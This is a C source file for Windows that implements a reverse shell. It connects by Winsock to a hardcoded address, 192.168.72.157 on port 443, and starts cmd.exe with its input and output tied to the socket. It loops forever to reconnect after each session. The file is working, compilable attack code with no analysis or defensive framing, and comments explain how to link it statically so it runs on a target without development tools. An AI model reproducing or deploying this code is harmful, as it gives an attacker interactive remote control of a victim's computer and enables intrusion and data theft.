#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>


// Needed to Statically compile, otherwise VS C/C++ is needed
// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "443"
#define DEFAULT_SERVER "192.168.72.157"


int confAddrInfo(struct addrinfo *result) {
	struct addrinfo hints;
	int iResult;

	// Config socket
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(DEFAULT_SERVER, DEFAULT_PORT, &hints, result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

}

int __cdecl main(int argc, char** argv)
{
	while (1) {
		WSADATA wsaData;
		SOCKET ConnectSocket = INVALID_SOCKET;
		struct addrinfo *result = NULL;
		const char* sendbuf = "this is a test";
		char recvbuf[DEFAULT_BUFLEN];
		int iResult;
		int recvbuflen = DEFAULT_BUFLEN;

		// Initialize Winsock
		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
		if (iResult != 0) {
			printf("WSAStartup failed with error: %d\n", iResult);
			continue;
		}

		// Ptr->Ptr PassbyRef
		iResult = confAddrInfo(&result);
		if (iResult != 0) {
			continue;
		}

		// Create a SOCKET for connecting to server
		ConnectSocket = WSASocket(result->ai_family, result->ai_socktype,
			result->ai_protocol, NULL, 0, 0);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			continue;
		}

		// Connect to server.
		printf("Connecting to server\n");
		iResult = WSAConnect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
		}

		freeaddrinfo(result);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("Unable to connect to server!\n");
			WSACleanup();
			continue;
		}

		// could be used to send additional information
		// Send an initial buffer
		//iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
		//if (iResult == SOCKET_ERROR) {
		//	printf("send failed with error: %d\n", WSAGetLastError());
		//	closesocket(ConnectSocket);
		//	WSACleanup();
		//	continue;
		//}
		//printf("Bytes Sent: %ld\n", iResult);

		printf("Spawning process\n");
		char Process[] = "C:\\Windows\\System32\\cmd.exe";
		STARTUPINFO sinfo;
		PROCESS_INFORMATION pinfo;
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) ConnectSocket;
		if (!CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
			printf("CreateProcess failed (%d).\n", GetLastError());
		}

		printf("Process exited\n");
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
		printf("Process exited\n");

		// Receive until the peer closes the connection
		//do {

		//	iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		//	if (iResult > 0)
		//		printf("Bytes received: %d\n", iResult);
		//	else if (iResult == 0)
		//		printf("Connection closed\n");
		//	else
		//		printf("recv failed with error: %d\n", WSAGetLastError());

		//} while (iResult > 0);

		// shutdown the connection since no more data will be sent
		iResult = shutdown(ConnectSocket, SD_SEND);
		if (iResult == SOCKET_ERROR) {
			printf("shutdown failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			continue;
		}


		// cleanup
		closesocket(ConnectSocket);
		WSACleanup();

		continue;
	}
	return 0;
}